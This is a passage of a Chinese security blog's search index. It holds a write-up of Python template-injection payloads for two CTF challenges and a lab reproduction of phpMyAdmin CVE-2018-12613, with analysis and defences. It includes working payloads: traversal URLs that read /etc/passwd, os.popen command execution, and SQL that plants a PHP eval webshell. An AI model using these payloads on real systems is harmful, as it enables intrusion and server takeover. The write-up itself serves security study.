class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(file.__dict__): print(i)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">(<span class="number">0</span>, <span class="string">&#x27;softspace&#x27;</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;encoding&#x27;</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;xreadlines&#x27;</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">&#x27;readlines&#x27;</span>)</span><br><span class="line">(<span class="number">4</span>, <span class="string">&#x27;flush&#x27;</span>)</span><br><span class="line">(<span class="number">5</span>, <span class="string">&#x27;close&#x27;</span>)</span><br><span class="line">(<span class="number">6</span>, <span class="string">&#x27;seek&#x27;</span>)</span><br><span class="line">(<span class="number">7</span>, <span class="string">&#x27;__init__&#x27;</span>)</span><br><span class="line">(<span class="number">8</span>, <span class="string">&#x27;newlines&#x27;</span>)</span><br><span class="line">(<span class="number">9</span>, <span class="string">&#x27;__setattr__&#x27;</span>)</span><br><span class="line">(<span class="number">10</span>, <span class="string">&#x27;errors&#x27;</span>)</span><br><span class="line">(<span class="number">11</span>, <span class="string">&#x27;__new__&#x27;</span>)</span><br><span class="line">(<span class="number">12</span>, <span class="string">&#x27;readinto&#x27;</span>)</span><br><span class="line">(<span class="number">13</span>, <span class="string">&#x27;__enter__&#x27;</span>)</span><br><span class="line">(<span class="number">14</span>, <span class="string">&#x27;next&#x27;</span>)</span><br><span class="line">(<span class="number">15</span>, <span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">(<span class="number">16</span>, <span class="string">&#x27;closed&#x27;</span>)</span><br><span class="line">(<span class="number">17</span>, <span class="string">&#x27;tell&#x27;</span>)</span><br><span class="line">(<span class="number">18</span>, <span class="string">&#x27;mode&#x27;</span>)</span><br><span class="line">(<span class="number">19</span>, <span class="string">&#x27;__exit__&#x27;</span>)</span><br><span class="line">(<span class="number">20</span>, <span class="string">&#x27;isatty&#x27;</span>)</span><br><span class="line">(<span class="number">21</span>, <span class="string">&#x27;truncate&#x27;</span>)</span><br><span class="line">(<span class="number">22</span>, <span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">(<span class="number">23</span>, <span class="string">&#x27;__getattribute__&#x27;</span>)</span><br><span class="line">(<span class="number">24</span>, <span class="string">&#x27;__iter__&#x27;</span>)</span><br><span class="line">(<span class="number">25</span>, <span class="string">&#x27;readline&#x27;</span>)</span><br><span class="line">(<span class="number">26</span>, <span class="string">&#x27;fileno&#x27;</span>)</span><br><span class="line">(<span class="number">27</span>, <span class="string">&#x27;writelines&#x27;</span>)</span><br><span class="line">(<span class="number">28</span>, <span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">(<span class="number">29</span>, <span class="string">&#x27;__doc__&#x27;</span>)</span><br><span class="line">(<span class="number">30</span>, <span class="string">&#x27;__delattr__&#x27;</span>)</span><br><span class="line">(<span class="number">31</span>, <span class="string">&#x27;__repr__&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>python3：没有file类，利用内置函数open()来读取文件</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&quot;open&quot;</span>](<span class="string">&quot;/etc/passwd&quot;</span>).read()</span><br></pre></td></tr></table></figure><p>当然还有命令执行、文件写入等操作，只需要找到相应的函数方法即可，比如<code>os.popen()、system()</code>等</p><h3 id="四、XCTF中SSTI相关题目"><a href="#四、XCTF中SSTI相关题目" class="headerlink" title="四、XCTF中SSTI相关题目"></a>四、XCTF中SSTI相关题目</h3><h4 id="1、-Web-python-template-injection"><a href="#1、-Web-python-template-injection" class="headerlink" title="1、 Web_python_template_injection"></a>1、 Web_python_template_injection</h4><p>题目页面提示为python模板注入，但是直接穿参没有效果，尝试访问index.php发现会有not found提示，于是在index.php后添加模板注入参数，成功解析：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898926.png" alt="1603894087160.png"></p><p>尝试读取flag文件无果后，利用命令执行来查看当前目录下文件，payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p>得到flag文件名：fl4g<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898936.png" alt="1603894436365.png"></p><p>读取flag，payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;fl4g&quot;</span>).read()</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898945.png" alt="1603894611355.png"></p><p>这道题目还用到了 <code>__init__</code>和<code>__globals__</code></p><ul><li><p> <code>__init__</code> ： 类的初始化方法 </p></li><li><p><code>__globals__</code> ： 对包含函数全局变量的字典的引用 </p></li></ul><h4 id="2、-easytornado"><a href="#2、-easytornado" class="headerlink" title="2、 easytornado"></a>2、 easytornado</h4><p>题目页面有三个文件链接，分别访问：</p><ul><li>flag.txt：提示 flag in /fllllllllllllag</li><li>welcome.txt：提示 render </li><li>hint.txt：提示 md5(cookie_secret+md5(filename)) </li></ul><p>而且访问该文件时，url会出现<strong>filename</strong>和<strong>filehash</strong>参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:46061/file?filename=/hints.txt&amp;filehash=4016066a51c646157d04c91b76864a4d</span><br></pre></td></tr></table></figure><p>由此断定，需要利用<strong>fllllllllllllag</strong>文件名构造得到filehash来访问得到flag；由hint提示的构造方法，得知构造filehash需要<strong>cookie_secret</strong>变量的值；由welcome提示的render以及题目描述Tornado框架，可知在Tornado中可利用<strong>handler.settings</strong>访问得到Web关键字参数</p><p>修改文件名为不存在，可触发error页面，msg参数传入模板解析数据，得到cookie_secret</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898956.png" alt="1603896553708.png"></p><p>利用已知数据及构造方式，得到filehash，访问即可得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:46061/file?filename=/fllllllllllllag&amp;filehash=362f231da5422730e87f8c009eb25f91</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898968.png" alt="1603898335323.png"></p><p>当然在实际中会对输入做安全过滤，绕过过滤的方法详见这几位师傅的博文：</p><p><a href="https://www.cnblogs.com/zaqzzz/p/10263396.html"><strong>https://www.cnblogs.com/zaqzzz/p/10263396.html</strong></a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html"><strong>https://www.cnblogs.com/20175211lyz/p/11425368.html</strong></a></p><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://www.anquanke.com/post/id/188172">https://www.anquanke.com/post/id/188172</a></p><p><a href="https://www.cnblogs.com/Xy--1/p/12841941.html">https://www.cnblogs.com/Xy–1/p/12841941.html</a></p><p><a href="https://www.cnblogs.com/hackxf/p/10480071.html">https://www.cnblogs.com/hackxf/p/10480071.html</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html">https://www.cnblogs.com/20175211lyz/p/11425368.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI模板注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】CVE-2018-12613 - phpmyadmin后台任意文件包含</title>
      <link href="post/202103242236.html"/>
      <url>post/202103242236.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00 简述"></a>0x00 简述</h2><p>由于对index.php中包含文件的target参数未作严格的安全校验，导致可以被利用绕过白名单、黑名单校验从而进行本地文件包含，达到GetShell和命令执行的效果。</p><p>要想利用该漏洞，攻击者必须经过身份验证，但在这些情况下除外：</p><ol><li>$ cfg [‘AllowArbitraryServer’] =<br>true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码</li><li>$ cfg [‘ServerDefault’] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码</li></ol><p>影响版本：</p><ul><li>Phpmyadmin Phpmyadmin 4.8.0</li><li>Phpmyadmin Phpmyadmin 4.8.0.1</li><li>Phpmyadmin Phpmyadmin 4.8.1</li></ul><h2 id="0x01-漏洞验证"><a href="#0x01-漏洞验证" class="headerlink" title="0x01 漏洞验证"></a>0x01 漏洞验证</h2><p>Docker拉取靶场环境，创建靶场环境<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808066.png" alt="2020-09-28_21-40-20.png"></p><p>浏览器访问8080端口，即可进入phpmyadmin界面，因为靶场用的是config方式的身份验证，因此不需要使用账号密码登录<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808074.png" alt="2020-09-28_21-57-06.png"></p><p>根据漏洞报告和网上师傅们的复现文章，是在index.php文件处存在本地文件包含漏洞，所以验证代码如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.11.12:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>成功读取passwd文件<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808090.png" alt="2020-09-28_22-26-26.png"></p><p>此时可以利用session文件写入**phpinfo()**木马，首先执行SQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo() ?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>然后F12查看此时用户的sessionID，也就是phpmyadmin的Cookie值，此值就是Mysql保存在本地的临时会话文件，使用以下url访问该临时文件，即可执行此前插入的木马语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.11.12:8080/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_8f36723f61b00567f291c3e7218be400</span><br></pre></td></tr></table></figure><p>注意：需要将sess_后的内容改为自己当前的Cookie值<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808107.png" alt="2020-09-28_22-29-49.png"></p><h2 id="0x02-GetShell"><a href="#0x02-GetShell" class="headerlink" title="0x02 GetShell"></a>0x02 GetShell</h2><h3 id="1-利用sesion文件"><a href="#1-利用sesion文件" class="headerlink" title="1.利用sesion文件"></a>1.利用sesion文件</h3><p>执行以下SQL命令，同上方法访问临时session文件，即可php命令在网站目录下创建a.php并写入一句话</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> `<span class="operator">&lt;</span>?php fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),<span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>);?<span class="operator">&gt;</span>`;</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808122.png" alt="2020-09-28_23-19-15.png"></p><p>蚁剑成功连接：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808128.png" alt="2020-09-28_23-19-45.png"></p><p>可打开虚拟终端和文件系统<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808145.png" alt="2020-09-28_23-20-22.png"></p><h3 id="2-利用数据库文件（frm表结构文件）"><a href="#2-利用数据库文件（frm表结构文件）" class="headerlink" title="2.利用数据库文件（frm表结构文件）"></a>2.利用数据库文件（frm表结构文件）</h3><p>通过创建表并将字段名定义为一句话木马，随后利用包含访问该文件即可：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808231.png" alt="2020-09-28_23-53-41.png"></p><p>但是因为我在Docker上搭建的环境，Web和Mysql用的2个主机环境，也就是库站分离，所以无法包含数据库文件，但是可以在Mysql虚拟机里看到木马：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808242.png" alt="2020-09-28_23-48-48.png"></p><p>所以和上边session文件一样，只需要将数据库字段名设置为以下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> `<span class="operator">&lt;</span>?php fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),<span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>);?<span class="operator">&gt;</span>`;</span><br></pre></td></tr></table></figure><p>然后包含相应的test.frm文件，即可执行命令在网站目录下创建一个a.php的木马</p><p>为了测试，我直接在Web主句目录下写入一个frm文件，然后在phpmyadmin中包含该文件：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808254.png" alt="2020-09-29_00-10-55.png"></p><p>即可创建a.php，蚁剑连接，成功进入shell环境：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808372.png" alt="2020-09-29_00-12-11.png"><br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808378.png" alt="2020-09-29_00-08-37.png"></p><h3 id="3-利用日志文件"><a href="#3-利用日志文件" class="headerlink" title="3.利用日志文件"></a>3.利用日志文件</h3><p>还有就是可以利用日志文件，但是当前环境权限不足，且没有开启日志功能，所以无法复现，具体原理同以上两种方法。</p><p>因为是存在本地文件包含，所以如果不是库站分离的情况下，是不需要修改日志路径为网站根路径的，任意路径即可，只需利用包含漏洞包含该日志文件，执行的php命令是在网站根路径创建新的木马文件。</p><p>打开general_log：set global general_log = on<br>执行以下命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> `<span class="operator">&lt;</span>?php fputs(fopen(&quot;/var/www/html/a.php&quot;,&quot;w&quot;),<span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>);?<span class="operator">&gt;</span>`;</span><br></pre></td></tr></table></figure><p>包含日志文件，即可在网站根目录生成a.php的一句话木马。</p><h2 id="0x03-原理分析"><a href="#0x03-原理分析" class="headerlink" title="0x03 原理分析"></a>0x03 原理分析</h2><p>漏洞形成在index.php文件中，通过includes来加载传入的target参数文件，在第55行到59行对target参数做了过滤：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808394.png" alt="2020-09-29_09-37-25.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// If we have a valid target, let&#x27;s load that script instead</span></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! in_array(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>], <span class="variable">$target_blacklist</span>)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>非空</li><li>是字符串</li><li>不能包含index</li><li>不在target_blacklist黑名单内</li></ol><p>其中target_blacklist内容在50到52行定义：import.php、export.php<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808406.png" alt="2020-09-29_10-32-13.png"></p><p> 第5个校验：通过Core类的checkPageValidity方法校验页面合法性</p><p>在源码中找到Core类，导出到本地<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808419.png" alt="2020-09-29_10-52-45.png"></p><p>在Core类443行找到了checkPageValidity方法：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808430.png" alt="2020-09-29_10-53-58.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$_page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中，第452行判断传进的page参数是否在whitelist白名单内，如果在内则判断成功，返回True，因此关键点就是让page也就是$_REQUEST[‘target’]，即target传入的文件名存在于该白名单whitelist内</p><p>该函数中whitelist参数是有默认值的，默认为空，而whitelist白名单又在第445到447行做了判断，判断传入的whitelist参数是否为空，如果为空则将Core类中的$goto_whitelist赋值给whitelist，因为在index.php文件中电泳该方法时并未指定whitelist，因此此时的whitelist内容就是Core类中的goto_whitelist内容</p><p>往前找，在Core类的31行定义了$goto_whitelist，如下：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808471.png" alt="2020-09-29_10-59-57.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$goto_whitelist</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_search.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_routines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_pages.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_schema.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_binlog.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_collations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_databases.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_engines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_privileges.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_advisor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_monitor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_queries.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_addfield.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_change.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_create.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_indexes.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_relation.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_replace.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_row_action.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_zoom_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_password.php&#x27;</span>,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>所以，只需要将target参数设定在该白名单内，即可成功返回True，但是我们需要做的是给target参数继续传参，达到任意文件包含，所以还需要看下边的？校验。</p><p>网上文章都对456行到473行的？校验做了分析，得到的结果是需要对？进行二次URL编码来绕过校验，但是其实由于代码的逻辑是先用？进行截断，取出？前的文件名来做白名单校验，成功直接返回True，不再执行下边urldecode后的？校验，所以其实不需要对？做编码处理，也可以成功执行：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808488.png" alt="2020-09-29_11-12-41.png"></p><p>但是还是分析一下原理：</p><p>这部分代码是这样的：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808495.png" alt="2020-09-29_11-26-32.png"></p><p>对page参数做了两次？的截断判断，将？前的文件名做白名单校验，第一次直接截断，失败后进行url解码再次截断判断。</p><p>其实也就表示允许target参数带参，如果传入的target参数也是带参的话，同样会将其参数指向的文件包含进来，也正是因为这种机制导致了任意文件包含。</p><p>不得不说phpmyadmin开发人员考虑的太周到了，又是主动urldecode，又是可以参数继续传参，多种判断都可以返回True，真是贴心，泪目~😭😭😭</p><h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><p>从用户角度来看的话，那就是升级版本，没得说。</p><p>从开发者角度来看，由于未能理解他们可以多次传参的初衷，所以我认为在没有必要的情况下可以将该功能删除，只保留target一次传参，即只能包含白名单内的文件。</p><p>而在后续的版本中也证实了这个观点，开发人员给Core的checkPageValidity方法加了一个include参数，用来标志是否开启连续传参：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808538.png" alt="2020-09-29_13-12-08.png"></p><p>当include参数为True时，即表示不允许多次传参。<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/27/1603808548.png" alt="2020-09-29_13-12-56.png"></p><p>PS：我怎么jiao的这块开发人员写错了呢🤨，应该是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="variable">$include</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就表示传参为True时，可以连续传参包含，传参为False时不允许，这也和$include的初始值相对应。</p><p>随便想想~</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2018-12613 </tag>
            
            <tag> phpmyadmin任意文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
